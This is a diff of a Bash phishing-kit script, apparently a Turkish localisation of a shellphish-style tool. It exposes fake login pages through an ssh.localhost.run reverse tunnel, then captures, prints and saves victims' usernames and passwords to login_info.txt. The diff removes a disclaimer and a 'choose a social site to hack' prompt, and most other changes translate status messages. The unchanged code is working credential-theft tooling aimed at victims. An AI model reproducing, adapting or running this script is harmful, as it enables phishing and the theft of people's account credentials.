@@ -69,15 +69,13 @@ loading
 clear
 printf "\n"
 printf "\e[1;92m __        __  _   _  __   __   _____   __  __   ____    _____  \e[0m\n"
-printf "\e[1;91m \ \      / / | | | | \ \ / /  | ____| |  \/  | |  _ \  | ____| \e[0m\n"
-printf "\e[1;91m  \ \ /\ / /  | |_| |  \ V /   |  _|   | |\/| | | |_) | |  _|   \e[0m\n"
+printf "\e[1;92m \ \      / / | | | | \ \ / /  | ____| |  \/  | |  _ \  | ____| \e[0m\n"
+printf "\e[1;92m  \ \ /\ / /  | |_| |  \ V /   |  _|   | |\/| | | |_) | |  _|   \e[0m\n"
 printf "\e[1;92m   \ V  V /   |  _  |   | |    | |___  | |  | | |  _ <  | |__   \e[0m\n"
 printf "\e[1;92m    \_/\_/    |_| |_|   |_|    |_____| |_|  |_| |_| \_\ |_____| \e[0m\n"
 printf "\n"
-printf "\e[1;93m       .:.:.\e[0m\e[1;94m ayyildiz.org & @whyemre \e[0m\e[1;93m.:.:.\e[0m\n\n"
-printf "  \e[101m\e[1;77m:: Sorumluluk Reddi Beyanı: Geliştiriciler hiçbir sorumluluk üstlenmez. ::\e[0m\n"
+printf "\e[1;93m          .:.:.\e[0m\e[1;94m AYYILDIZ.ORG & @WHYEMRE \e[0m\e[1;93m.:.:.    \e[0m\n\n"
 printf " \n"
-printf " \e[36;1m.:. Hacklemek istediğiniz herhangi bir sosyal siteyi seçin .:.\e[0m\n"
 printf " \n"
 }
 
@@ -464,7 +462,7 @@ printf "\n"
 if [[ -e linksender ]]; then
 rm -rf linksender
 fi
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Oturum Açma Bilgisini görüntülemek için Ctrl + C Kurban Açtıktan Sonra Basın.\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96mCtrl + C Tuşlarına basarak işlemi sonlandırabilirsiniz ...\e[0m\n"
 printf "\e[1;93m\n"
 ssh -R 80:localhost:$port ssh.localhost.run 2>&1
 printf "\e[0m\n"
@@ -509,7 +507,7 @@ found
 }
 found() {
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Giriş Bilgisi Bekleniyor, Basın\e[0m\e[1;96m Ctrl + C \e[1;93mçıkışa doğru ...\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Sonraki Giriş Bilgisi Bekleniyor, Çıkmak İçin\e[0m\e[1;96m Ctrl + C \e[1;93mTuşlarına basın ...\e[0m\n"
 printf "\n"
 while [ true ]; do
 if [[ -e "sites/$server/ip.txt" ]]; then
@@ -544,13 +542,13 @@ c_cred() {
 account=$(grep -o 'Username:.*' sites/$server/usernames.txt | cut -d " " -f2)
 IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Account:\e[0m\e[1;96m %s\n\e[0m" $account
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Password:\e[0m\e[1;96m %s\n\e[0m" $password
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Hesap:\e[0m\e[1;96m %s\n\e[0m" $account
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Parola:\e[0m\e[1;96m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/login_info.txt
 printf "\e[0m\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Saved:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;96m Kaydedildi:\e[0m\e[1;93m sites/%s/login_info.txt\e[0m\n" $server
 printf "\n"
-printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Waiting for Next Login Info, Press\e[0m\e[1;96m Ctrl + C \e[1;93mto exit ...\e[0m\n"
+printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Sonraki Giriş Bilgisi Bekleniyor, Çıkmak İçin \e[0m\e[1;96m Ctrl + C \e[1;93m Tuşlarına basın ...\e[0m\n"
 }
 banner
 dependencies
